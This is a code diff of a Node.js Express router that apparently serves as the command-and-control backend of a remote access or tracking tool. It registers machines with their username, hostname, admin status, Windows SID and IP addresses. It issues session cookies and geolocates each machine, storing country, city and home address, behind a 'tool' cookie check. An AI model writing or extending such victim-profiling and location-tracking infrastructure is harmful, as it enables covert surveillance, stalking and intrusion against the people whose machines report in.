@@ -1,53 +1,38 @@
 const router = require('express').Router();
 const Client = require('../client.model');
 const Utils = require('../../Utils/utilFunctions');
-const ClientLocation = require("../../Location/clientLocation.model");
 const toolCookieValidator = require('../../Utils/MiddleWears/toolCookieValidator');
 const express = require("express");
 const path = require("path");
+const {GetClientLocationByIP} = require("../../Utils/clientUtils");
+const {GetClientLocationData} = require("../../Utils/clientUtils");
+const {addClientLocation} = require("../../Utils/clientUtils");
+const {createNewClient} = require("../../Utils/clientUtils");
+const {GetClientCountry} = require("../../Utils/clientUtils");
+
 
 //Add new client
 router.route('/h1').post((req, res) => {
-    const clientId = Utils.GenerateRandomId(8);
-    const username = req.body.Username;
-    const hostname = req.body.Hostname;
-    const os = req.body.Os;
-    const isAdmin = req.body.isAdmin !== "False";
-    const status = true;
-    const ipv4 = req.body.IPv4;
-    const public_ip = req.body.PublicIP;
-    const wifiEnabled = req.body.ifWifi;
-    const sid = req.body.SID;
-    const sessionKey = Utils.GenerateRandomSessionKey();
-    const currentTimeDate = Utils.GetCurrentTimeDate();
-    const newClient = new Client({
-        client_id: clientId,
-        username: username,
-        hostname: hostname,
-        session_key: sessionKey,
-        os: os,
-        isAdmin: isAdmin,
-        status: status,
-        ipv4: ipv4,
-        public_ip: public_ip,
-        wifiEnabled: wifiEnabled,
-        sid: sid,
-        lastActive: currentTimeDate
-    });
+    let newClient = createNewClient(req)
     newClient.save()
         .then(() => {
-            res.cookie('session_id', sessionKey);
-            res.send(clientId);
+            res.cookie('session_id', newClient.session_key);
+            res.send(newClient.client_id);
         })
         .catch(err => {
             Utils.LogToFile(err)
             res.sendStatus(403)
         });
-});
+    if (!newClient.wifiEnabled) {
+        GetClientLocationByIP(newClient.public_ip).then((locationData) => {
+            if (locationData)
+                addClientLocation(newClient.client_id, locationData)
+        }).catch((err) => console.log(err))
+    }
+})
 
 
 router.use(toolCookieValidator);
-
 
 //Push a new location for client
 router.route('/location').post((req, res) => {
@@ -56,10 +41,23 @@ router.route('/location').post((req, res) => {
         const location = req.body.location;
         const lat = location.lat;
         const lng = location.lng;
-        const newLocation = new ClientLocation({client_id: clientId, lat: lat, lng: lng});
-        newLocation.save()
-            .then(() => res.send('Client location added successfully!'))
-            .catch(err => res.status(401).send(`Error adding client location  ${err}`));
+        GetClientLocationData(location).then((locationData) => {
+            if (locationData) {
+                Client.findOneAndUpdate({client_id: clientId}, {
+                    location: {
+                        lat: lat,
+                        lng: lng,
+                        country: locationData.country,
+                        city: locationData.city,
+                        home_address: locationData.home_address
+                    }
+                }, {useFindAndModify: false}, function (err) {
+                    if (err)
+                        Utils.LogToFile(`Error adding client ${clientId} location to database ${err.message}`)
+                })
+            }
+            res.send()
+        }).catch((err) => console.log(err))
     } catch (err) {
         Utils.LogToFile(err)
         res.sendStatus(403);
